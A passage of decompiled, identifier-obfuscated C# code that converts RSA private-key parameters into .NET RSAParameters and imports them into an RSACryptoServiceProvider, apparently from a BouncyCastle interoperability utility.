      P = _param0.\u206B⁪‫‎⁮⁮‬‍‫‍⁮⁯⁮‪⁬‬‎⁫⁪‪⁮​⁫⁭⁭‫⁪⁬⁮‍‪‬‏‭⁫‏‎‏⁬‏‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮(),
      Q = _param0.\u202C⁪‏⁮‌⁭⁪‭‬‬⁫⁮⁪⁪⁪⁮⁭‍‪‌‮⁫‭⁫‌⁭‎‏‍‬⁬‫‭‬‮‭‭⁪⁫⁭‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮()
    };
    rsaParameters.D = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u206A​⁮‎​‮‪⁫⁬‏​⁭‍​‏‬​⁫⁯​⁫‍⁫‬‪‎‌‮‬​‏‬‎⁮‬⁬‮⁬⁫⁯‮, rsaParameters.Modulus.Length);
    rsaParameters.DP = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u200D‮‭‮‍‬‪⁪⁮‬​‪⁪‏‏⁫‭‪​​‎⁭‏⁯⁬‫‌‬‍‫‫⁮‍‏‮‬‮‭‍‭‮, rsaParameters.P.Length);
    rsaParameters.DQ = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u202A⁭⁬⁫‎‬⁭‫‏⁭​‍‌⁫‍‬⁬‍‪‍⁮⁮‍⁮‌​‌​‏‬‬‍⁮‏⁪‭‬‪​‪‮, rsaParameters.Q.Length);
    rsaParameters.InverseQ = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u206E‌‌⁪‍‌‪‏‫‪‪‭⁬⁭‫⁭‌‌‭‭‮⁬⁮‍‏‪‬‏​​‮⁫‏​⁫‮‌⁭⁫⁭‮, rsaParameters.Q.Length);
    return rsaParameters;
  }

  public static RSAParameters \u200C‮‬‪‍⁪‬‭‫⁬⁫⁮‬‭‎‫‍⁪⁫⁪‌⁬‍‪‭‮‫⁮‭‫⁫‎⁬‫⁪⁫‪​‮⁬‮(
    \u202E⁭⁭⁬‎⁫⁮⁮⁮⁮‭‪‭⁮‮‪‌‫⁪⁬‪⁯⁬‫‏‭⁮‮⁮⁮‎⁯‏‫‪​⁬⁯‬⁭‮ _param0)
  {
    RSAParameters rsaParameters = new RSAParameters()
    {
      Modulus = _param0.\u200D‌⁯‍‭‪‍⁭⁪​‭‮⁬‌⁯⁮⁮‏⁬⁯‪‪‏⁪‏⁬‍​‌‎⁮‬⁬‍‭‎‫‪‮‏‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮(),
      Exponent = _param0.\u200C‮‫⁯‮‏‮‍⁫⁯‭‍‍‬​‏​‍‌‮​‌⁫‪​​​⁫‏​⁮‭‮‪‏‎‮⁬‌⁮‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮(),
      P = _param0.\u202D‮⁮‏​⁪‮‫⁬‌⁪‌‍‮⁭⁬⁭⁭‫⁫‎‍⁬​‍⁭‌⁮‭⁪‌⁪⁮⁮‍‌⁯‍‪‎‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮(),
      Q = _param0.\u206E⁫​⁪⁪⁮⁯⁮‮​⁯‎‪‭‎⁫⁯‍‫⁯​‍‫‌‏‪‎​⁯‮​⁬‮‭⁯‪​⁯‫⁭‮.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮()
    };
    rsaParameters.D = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u206B‮⁮⁬‮⁬⁬⁮‏‭​​‬⁫⁮⁫​⁯‌‫⁮‭‌‬‎‫‬⁯⁫⁪‎​⁯‫‮⁯⁮⁭‫‮‮, rsaParameters.Modulus.Length);
    rsaParameters.DP = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u206E‮⁮‎‭‪​⁪‪‭‬⁮‪⁮⁬⁮⁫‫⁯‬‬⁭⁮‍‪⁮​‎‏⁮‬‫‬‏⁮​‌‬​‏‮, rsaParameters.P.Length);
    rsaParameters.DQ = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u200E‎‪‎‬‫‬‭‌‍‭⁮⁮⁪‍⁪⁯‎‪⁫‌‍‫‪‏⁫‌‎‏‎‬⁮⁬⁪⁮‌‮‬‪‏‮, rsaParameters.Q.Length);
    rsaParameters.InverseQ = \u200D⁫⁯‍‌​⁮⁫‭‍​⁫‎⁬‪‭‎‪‏⁯‪⁫⁫⁬‌‫‪⁪‌⁬‏‍⁬⁮‎‮⁪⁮⁯‭‮.\u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(_param0.\u202E⁫‪⁭⁯‭‪⁭‮⁯‪⁮‫‏‫​⁯⁬⁫‏⁯​‏‮‫⁬‍‪​‎‫‭‮⁫‌‫‫‮⁫‫‮, rsaParameters.Q.Length);
    return rsaParameters;
  }

  private static byte[] \u206C‭⁮⁯‎⁪‪‌⁯‎‌⁯‭‫‪‎‫⁭‌⁬‭⁪‍‌⁮‪⁫⁮⁫⁫⁭⁫⁫‎⁬⁭‌⁬‮‮‮(
    \u200B‌‏⁫⁬⁬‬⁬‌‎‪⁮‭​‎​‬‎⁯⁮‏​‫‬‫⁫⁫‫⁫​‮‫⁭​⁬⁬⁬‎‭‍‮ _param0,
    int _param1)
  {
    byte[] sourceArray = _param0.\u206D‬​⁪⁭​​⁬‍⁪⁫⁬‫‫⁪‌‬‬⁯‮‌‏‮⁬⁮‎‎‬‭‮‫⁪‪⁯‎⁬‏⁯⁯‮‮();
    if (sourceArray.Length == _param1)
      return sourceArray;
    if (sourceArray.Length > _param1)
      throw new ArgumentException("Specified size too small", "size");
    byte[] destinationArray = new byte[_param1];
    Array.Copy((Array) sourceArray, 0, (Array) destinationArray, _param1 - sourceArray.Length, sourceArray.Length);
    return destinationArray;
  }

  private static RSA \u202A⁬⁭‫‌⁬‫⁯​‬⁮‏‪‫⁫⁭⁪⁭‌‬⁭‏‌​‫⁪‭‌⁬‮‭⁬⁯‌⁫⁪‬⁫⁪‮(RSAParameters _param0)
  {
    RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(new CspParameters()
    {
      KeyContainerName = string.Format("BouncyCastle-{0}", (object) Guid.NewGuid())
    });
    cryptoServiceProvider.ImportParameters(_param0);
    return (RSA) cryptoServiceProvider;
  }

  private static RSA \u202A⁬⁭‫‌⁬‫⁯​‬⁮‏‪‫⁫⁭⁪⁭‌‬⁭‏‌​‫⁪‭‌⁬‮‭⁬⁯‌⁫⁪‬⁫⁪‮(
    RSAParameters _param0,
    CspParameters _param1)
  {
    RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(_param1);
    cryptoServiceProvider.ImportParameters(_param0);
    return (RSA) cryptoServiceProvider;
  }
}
